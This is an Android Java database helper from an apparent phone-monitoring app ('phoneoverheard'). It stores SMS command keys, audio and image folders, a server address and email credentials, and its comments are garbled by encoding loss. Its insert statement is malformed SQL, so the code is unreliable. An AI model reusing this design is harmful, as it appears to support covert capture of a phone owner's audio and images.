package com.phoneoverheard.database;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;


import android.annotation.SuppressLint;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.os.IBinder;

@SuppressLint("SimpleDateFormat")
public class ManagerService extends Service {
    @SuppressWarnings("unused")
	private static final String TAG = "ManagerService";  
    private DatabaseHelper ManagerDatabasehelper; 
	Date date = new Date(System.currentTimeMillis());
	SimpleDateFormat Dateformat = new SimpleDateFormat("yyyyMMddHHmmss");
	String receiveTime = Dateformat.format(date);
	@Override
	public IBinder onBind(Intent arg0) {
		return null;
	}
	
	public ManagerService(Context context){
		this.ManagerDatabasehelper = new DatabaseHelper(context);
	}

	public  void close() {
		if (ManagerDatabasehelper != null) {
			ManagerDatabasehelper.close();
		}
	}
	
	@Override
	public void onDestroy() {
		super.onDestroy();
		if (ManagerDatabasehelper != null) {
			ManagerDatabasehelper.close();
		}
	}
	
	/**
     *�����Ա���в�������
     * @param manager   
     * @return ��
     */
	public void insert (Manager manager){
		SQLiteDatabase db = ManagerDatabasehelper.getWritableDatabase();    	
    	db.execSQL("insert into manager values(smskey,password,telnumber,cmdsql,audiofolder,imgfolder,serverport,serveraddress,hostip,hostmac,mailsendto,mailpassword,mailfrom) values(?,?,?,?,?,?,?,?,?,?,?,?,?)",
    			new Object[]{manager.getSmskey(),manager.getPassword(),manager.getTelnumber(),manager.getCmdsql(),manager.getAudiofolder(),manager.getImgfolder(),manager.getServerport(),manager.getServeraddress(),
    			manager.getHostip(),manager.getHostmac(),manager.getMailsendto(),manager.getMailpassword(),manager.getMailfrom()});
    	db.close();
    	close();
    	onDestroy();
    }
    
	/** 
     *�ӹ���Ա����ɾ������
     * @param smskey 
     * @return ��
     */
    public void delete (String smskey){ 
    	SQLiteDatabase db = ManagerDatabasehelper.getWritableDatabase();
    	db.execSQL("delete from manager where smskey=?", new Object[]{smskey});
    	db.close();
    	close();
    	onDestroy();
    }
    
	/**
     *�޸Ĺ���Ա��������
     * @param manager 
     * @return ��
     */
    public void updateHostAdress (String smskey,String hostip,String hostmac){
    	SQLiteDatabase db = ManagerDatabasehelper.getWritableDatabase();
    	db.execSQL("update manager set hostip=?,hostmac=? where smskey=?",
    			new Object[]{ hostip,hostmac,smskey});
    	db.close();
    	close();
    	onDestroy();
    }
    
	/**
     *�޸Ĺ���Ա��������
     * @param manager 
     * @return ��
     */
    public void updateCmdsql (String smskey,String cmdsql){ 
    	SQLiteDatabase db = ManagerDatabasehelper.getWritableDatabase();
    	db.execSQL("update manager set cmdsql=? where smskey=?",
    			new Object[]{ cmdsql,smskey});
    	db.close();
    	close();
    	onDestroy();
    }
    
	/**
     *�޸Ĺ���Ա��������
     * @param db �򿪵����ݿ����
     * @param smskey ָ��ؼ���
     * @param imgfolder ͼƬ���Ŀ¼
     * @return ��
     */
    public void updateImgfolder (String smskey,String imgfolder){ 
    	SQLiteDatabase db = ManagerDatabasehelper.getWritableDatabase();
    	db.execSQL("update manager set imgfolder=? where smskey=?",new Object[]{ imgfolder,smskey});
    	db.close();
    	close();
    	onDestroy();
    }
 
	/**
     *�޸Ĺ���Ա��������
     * @param db �򿪵����ݿ����
     * @param smskey ָ��ؼ���
     * @param audiofolder ��Ƶ�ļ����Ŀ¼
     * @return ��
     */
    public void updateAudiofolder (String smskey,String audiofolder){
    	SQLiteDatabase db = ManagerDatabasehelper.getWritableDatabase();
    	db.execSQL("update manager set audiofolder=? where smskey=?",new Object[]{audiofolder,smskey});
    	db.close();
    	close();
    	onDestroy();
    }

	/**
     *���ҹ���Ա����ĳ�� ����
     * @param manager 
     * @return ��
     */
    public Manager findFolder (SQLiteDatabase db,String smskey){ 
    	String password = "";
    	String telnumber = "";
    	String cmdsql = "";
    	String audiofolder = "";
    	String imgfolder = "";
    	String serverport = "";
    	String serveraddress = "";
    	String hostip = "";
    	String hostmac = "";
    	String mailsendto = "";
    	String mailpassword = "";
    	String mailfrom = "";
    	Cursor managerCursor = db.rawQuery("select * from manager where smskey=?", new String[]{smskey});
    	if(managerCursor.moveToFirst()){
    		smskey = managerCursor.getString(managerCursor.getColumnIndex("smskey"));
    		password = managerCursor.getString(managerCursor.getColumnIndex("password"));
    		telnumber = managerCursor.getString(managerCursor.getColumnIndex("telnumber"));
    		cmdsql = managerCursor.getString(managerCursor.getColumnIndex("cmdsql"));
    		audiofolder = managerCursor.getString(managerCursor.getColumnIndex("audiofolder"));
    		imgfolder = managerCursor.getString(managerCursor.getColumnIndex("imgfolder"));
    		serverport = managerCursor.getString(managerCursor.getColumnIndex("serverport"));
    		serveraddress = managerCursor.getString(managerCursor.getColumnIndex("serveraddress"));
    		hostip = managerCursor.getString(managerCursor.getColumnIndex("hostip"));
    		hostmac = managerCursor.getString(managerCursor.getColumnIndex("hostmac"));
    		mailsendto = managerCursor.getString(managerCursor.getColumnIndex("mailsendto"));
    		mailpassword = managerCursor.getString(managerCursor.getColumnIndex("mailpassword"));
    		mailfrom = managerCursor.getString(managerCursor.getColumnIndex("mailfrom"));  
    	}
    	if(managerCursor != null){
    		managerCursor.close();
    	}
    	db.close();
    	close();
    	onDestroy();
		return new Manager(smskey,password,telnumber,cmdsql,audiofolder,imgfolder,serverport,serveraddress,hostip,hostmac,mailsendto,mailpassword,mailfrom);	
    }
    
	/**
     *���ҹ���Ա����ĳ�� ����
     * @param manager 
     * @return ��
     */
    public Manager find (String smskey){ 
    	String password = "";
    	String telnumber = "";
    	String cmdsql = "";
    	String audiofolder = "";
    	String imgfolder = "";
    	String serverport = "";
    	String serveraddress = "";
    	String hostip = "";
    	String hostmac = "";
    	String mailsendto = "";
    	String mailpassword = "";
    	String mailfrom = "";
    	SQLiteDatabase db = ManagerDatabasehelper.getReadableDatabase();
    	Cursor managerCursor = db.rawQuery("select * from manager where smskey=?", new String[]{smskey});
    	if(managerCursor.moveToFirst()){
    		smskey = managerCursor.getString(managerCursor.getColumnIndex("smskey"));
    		password = managerCursor.getString(managerCursor.getColumnIndex("password"));
    		telnumber = managerCursor.getString(managerCursor.getColumnIndex("telnumber"));
    		cmdsql = managerCursor.getString(managerCursor.getColumnIndex("cmdsql"));
    		audiofolder = managerCursor.getString(managerCursor.getColumnIndex("audiofolder"));
    		imgfolder = managerCursor.getString(managerCursor.getColumnIndex("imgfolder"));
    		serverport = managerCursor.getString(managerCursor.getColumnIndex("serverport"));
    		serveraddress = managerCursor.getString(managerCursor.getColumnIndex("serveraddress"));
    		hostip = managerCursor.getString(managerCursor.getColumnIndex("hostip"));
    		hostmac = managerCursor.getString(managerCursor.getColumnIndex("hostmac"));
    		mailsendto = managerCursor.getString(managerCursor.getColumnIndex("mailsendto"));
    		mailpassword = managerCursor.getString(managerCursor.getColumnIndex("mailpassword"));
    		mailfrom = managerCursor.getString(managerCursor.getColumnIndex("mailfrom"));  
    	}
    	if(managerCursor != null){
    		managerCursor.close();
    	}
    	db.close();
    	close();
    	onDestroy();
    	return new Manager(smskey,password,telnumber,cmdsql,audiofolder,imgfolder,serverport,serveraddress,hostip,hostmac,mailsendto,mailpassword,mailfrom);
    }
    
	/**
     *��ҳ��ѯ����Ա��������
     * @param pffset �ӵڼ������ݿ�ʼ
     * @param maxResult ��󷵻ؼ�������
     * @return List<Smscmd> �����
     */
    public List<Manager> getScrolldata (int pffset,int maxResult){ 
    	List<Manager> manager = new ArrayList<Manager>();
    	SQLiteDatabase db = ManagerDatabasehelper.getReadableDatabase();
    	Cursor managerCursor = db.rawQuery("select * from manager order by _id asc limit ?,?", 
    				new String[]{String.valueOf(pffset),String.valueOf(maxResult)});
    	while(managerCursor.moveToNext()){
    		String smskey = managerCursor.getString(managerCursor.getColumnIndex("smskey"));
    		String password = managerCursor.getString(managerCursor.getColumnIndex("password"));
    		String telnumber = managerCursor.getString(managerCursor.getColumnIndex("telnumber"));
    		String cmdsql = managerCursor.getString(managerCursor.getColumnIndex("cmdsql"));
    		String audiofolder = managerCursor.getString(managerCursor.getColumnIndex("audiofolder"));
    		String imgfolder = managerCursor.getString(managerCursor.getColumnIndex("imgfolder"));
    		String serverport = managerCursor.getString(managerCursor.getColumnIndex("serverport"));
    		String serveraddress = managerCursor.getString(managerCursor.getColumnIndex("serveraddress"));
    		String hostip = managerCursor.getString(managerCursor.getColumnIndex("hostip"));
    		String hostmac = managerCursor.getString(managerCursor.getColumnIndex("hostmac"));
    		String mailsendto = managerCursor.getString(managerCursor.getColumnIndex("mailsendto"));
    		String mailpassword = managerCursor.getString(managerCursor.getColumnIndex("mailpassword"));
    		String mailfrom = managerCursor.getString(managerCursor.getColumnIndex("mailfrom"));
    		manager.add(new Manager(smskey,password,telnumber,cmdsql,audiofolder,imgfolder,serverport,serveraddress,hostip,hostmac,mailsendto,mailpassword,mailfrom));
    	}
    	if(managerCursor != null){
    		managerCursor.close();
    	}
    	db.close();
    	close();
    	onDestroy();
		return manager;
    }
    
	/**
     *��ѯ����Ա���м�¼����
     * @param ��
     * @return result ��¼����
     */
    public Long getCount (){ 
    	SQLiteDatabase db = ManagerDatabasehelper.getReadableDatabase();
    	Cursor managerCursor = db.rawQuery("select count(*) from manager", null);
    	managerCursor.moveToFirst();
    	long result = managerCursor.getLong(0);
    	if(managerCursor != null){
    		managerCursor.close();
    	}
    	db.close();
    	close();
    	onDestroy();
		return result;
    }
}
